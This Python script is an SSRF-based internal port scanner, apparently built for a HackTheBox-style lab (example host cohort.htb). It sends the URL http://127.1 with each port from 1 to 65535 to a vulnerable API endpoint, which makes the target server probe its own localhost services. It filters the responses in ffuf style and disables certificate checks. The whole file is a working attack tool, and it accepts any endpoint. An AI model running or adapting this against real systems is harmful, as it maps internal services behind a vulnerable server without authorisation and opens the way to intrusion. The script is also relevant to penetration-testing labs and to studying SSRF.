import argparse
import re
import sys
import threading
import time
import requests
import urllib3

# Suppress insecure request warnings (-k equivalent)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def parse_range_string(val_str):
  """Parses ffuf-style lists and ranges (e.g., '200,300-400,500')."""
  items = set()
  if not val_str:
    return items
  for part in val_str.split(","):
    part = part.strip()
    if "-" in part:
      try:
        start, end = map(int, part.split("-"))
        items.update(range(start, end + 1))
      except ValueError:
        pass
    else:
      try:
        items.add(int(part))
      except ValueError:
        pass
  return items


# Set up command-line arguments
parser = argparse.ArgumentParser(
    description=(
        "API-based Port Scanner with -u endpoint and ffuf-style filtering."
    )
)
parser.add_argument(
    "-u",
    "--url",
    required=True,
    help="Target API endpoint (e.g., https://cohort.htb/api/validate)",
)
parser.add_argument(
    "-t",
    "--timeout",
    type=float,
    default=2.0,
    help="Request timeout in seconds (default: 2.0)",
)
parser.add_argument(
    "-fc",
    type=str,
    default="",
    help="Filter HTTP status codes (e.g., 404,500-503)",
)
parser.add_argument(
    "-fs",
    type=str,
    default="",
    help="Filter HTTP response sizes in bytes (e.g., 89,120-150)",
)
parser.add_argument(
    "-fl", type=str, default="", help="Filter response line counts"
)
parser.add_argument(
    "-fw", type=str, default="", help="Filter response word counts"
)
parser.add_argument("-fr", type=str, default="", help="Filter regular expression")
args = parser.parse_args()

# Compile filter lists/rules
filter_codes = parse_range_string(args.fc)
filter_sizes = parse_range_string(args.fs)
filter_lines = parse_range_string(args.fl)
filter_words = parse_range_string(args.fw)
filter_regex = re.compile(args.fr) if args.fr else None

api_url = args.url
headers = {"Content-Type": "application/json"}
start_port = 1
end_port = 65535
total_ports = (end_port - start_port) + 1

current_port = start_port
lock = threading.Lock()
scanning_done = False


def monitor_progress():
  """Listens for the Enter keypress to print the current percentage."""
  global current_port, scanning_done
  while not scanning_done:
    try:
      input()
    except (EOFError, KeyboardInterrupt):
      break
    with lock:
      if scanning_done:
        break
      ports_scanned = (current_port - start_port) + 1
      percent = (ports_scanned / total_ports) * 100
      print(
          f"\n[*] Status: {percent:.2f}% done"
          f" ({ports_scanned}/{total_ports} ports scanned)",
          flush=True,
      )


monitor_thread = threading.Thread(target=monitor_progress, daemon=True)
monitor_thread.start()

print(f"\n[*] Starting port scan using endpoint: {api_url}")
print(f"[*] Timeout: {args.timeout}s")
print(
    f"[*] Scanning ports {start_port} to {end_port}..."
    " (Press [Enter] for progress, [Ctrl+C] to exit)\n"
)
print(
    f"{'PORT':<8} | {'STATUS':<6} | {'SIZE':<6} | {'WORDS':<6} |"
    f" {'LINES':<6} | {'RESPONSE PREVIEW'}"
)
print("-" * 75)

start_time = time.time()

try:
  for port in range(start_port, end_port + 1):
    with lock:
      current_port = port

    target_url = f"http127.1:{port}/" if False else f"http://127.1:{port}/"
    payload = {"url": target_url, "format": "csv"}

    try:
      response = requests.post(
          api_url,
          json=payload,
          headers=headers,
          verify=False,
          timeout=args.timeout,
      )

      status = response.status_code
      body = response.text
      size = len(response.content)
      lines = len(body.splitlines())
      words = len(body.split())

      # Apply ffuf-style filtering logic (hides matching results)
      if status in filter_codes:
        continue
      if size in filter_sizes:
        continue
      if lines in filter_lines:
        continue
      if words in filter_words:
        continue
      if filter_regex and filter_regex.search(body):
        continue

      # Format output cleanly like ffuf tables
      preview = body.replace("\n", " ")[:40]
      print(
          f"{port:<8} | {status:<6} | {size:<6} | {words:<6} | {lines:<6} |"
          f" {preview}",
          flush=True,
      )

    except requests.exceptions.RequestException:
      pass

except KeyboardInterrupt:
  print("\n\n[!] Scan interrupted by user (Ctrl+C). Exiting gracefully...")

finally:
  with lock:
    scanning_done = True
  elapsed_time = time.time() - start_time
  print(f"\n[+] Script finished in {elapsed_time:.2f} seconds.", flush=True)
  sys.exit(0)
